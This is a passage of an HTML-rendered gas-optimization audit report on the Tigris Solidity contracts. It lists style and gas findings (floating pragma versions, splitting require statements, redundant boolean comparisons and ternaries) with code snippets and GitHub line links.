class=\"mtk1\">/</span><span class=\"mtk12\">ILayerZeroEndpoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroEndpoint.sol#L3</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILayerZeroReceiver</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroReceiver.sol#L3</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILayerZeroUserApplicationConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroUserApplicationConfig.sol#L3</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"146\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IPairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPairsContract.sol#L3</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L3</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"148\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IReferrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IReferrals.sol#L3</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IStableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IStableVault.sol#L3</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"150\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ITrading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L5</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"151\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"152\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"153\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"154\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"155\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"156\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"157\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"158\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"159\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MetaContext</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"160\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L2</p>\n<h2 id=\"g16--splitting-require-statements-that-use--saves-gas\" style=\"position:relative;\"><a href=\"#g16--splitting-require-statements-that-use--saves-gas\" aria-label=\"g16  splitting require statements that use  saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑16]  Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</h2>\n<p>See <a href=\"https://github.com/code-423n4/2022-01-xdefi-findings/issues/128\">this issue</a> which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by <strong>3 gas</strong></p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"161\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_maxLeverage</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Wrong leverage values&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L52</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"162\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">887</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() &amp;&amp; </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">time</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Proxy not approved&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L887</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"163\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">                   </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">                       </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">+</span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">*</span><span class=\"mtk7\">2</span><span class=\"mtk1\">/</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">                       </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">-</span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">*</span><span class=\"mtk7\">2</span><span class=\"mtk1\">/</span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!chainlinkPrice&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:                  );</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L116-L119</p>\n<h2 id=\"g17--dont-compare-boolean-expressions-to-boolean-literals\" style=\"position:relative;\"><a href=\"#g17--dont-compare-boolean-expressions-to-boolean-literals\" aria-label=\"g17  dont compare boolean expressions to boolean literals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑17]  Don’t compare boolean expressions to boolean literals</h2>\n<p><code>if (&#x3C;x> == true)</code> => <code>if (&#x3C;x>)</code>, <code>if (&#x3C;x> == false)</code> => <code>if (!&#x3C;x>)</code></p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"164\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] ? </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> : </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] ? </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> : </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L238</p>\n<h2 id=\"g18--ternary-unnecessary\" style=\"position:relative;\"><a href=\"#g18--ternary-unnecessary\" aria-label=\"g18  ternary unnecessary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑18]  Ternary unnecessary</h2>\n<p><code>z = (x == y) ? true : false</code> => <code>z = (x == y)</code></p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"165\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] ? </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> : </span><span class=\"mtk4\">false</span><span 